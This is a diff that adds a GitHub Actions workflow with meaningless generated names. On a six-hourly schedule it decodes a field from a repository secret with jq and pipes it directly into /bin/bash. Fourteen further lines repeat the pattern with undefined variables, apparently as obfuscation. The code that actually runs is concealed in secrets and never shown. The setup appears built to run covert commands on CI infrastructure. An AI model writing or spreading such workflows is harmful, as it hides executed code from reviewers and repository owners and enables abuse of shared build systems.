@@ -1,0 +1,32 @@
+name: zhenwangxia6715
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhenwangxia6715
+        env:
+          ft8063: ${{ secrets.ft8063 }}
+        run: |
+          echo $ft8063 | jq -r .up78544 | /bin/bash
+          echo $eh8754 | jq -r .ztqu98 | /bin/bash
+          echo $jyx4 | jq -r .ery51 | /bin/bash
+          echo $hj6 | jq -r .wh6563 | /bin/bash
+          echo $l9 | jq -r .pihz4194 | /bin/bash
+          echo $vvbcn5451 | jq -r .adadi43791 | /bin/bash
+          echo $huqfm8 | jq -r .urte131 | /bin/bash
+          echo $owrwc03 | jq -r .ixr19077 | /bin/bash
+          echo $xdmar409 | jq -r .ewclz18551 | /bin/bash
+          echo $kauzy46765 | jq -r .zeks84063 | /bin/bash
+          echo $pzne5 | jq -r .y7093 | /bin/bash
+          echo $ij93 | jq -r .di7220 | /bin/bash
+          echo $wyhxk1210 | jq -r .cc0161 | /bin/bash
+          echo $tewbf386 | jq -r .eg866 | /bin/bash
+          echo $rdkl63443 | jq -r .wuzds373 | /bin/bash
+
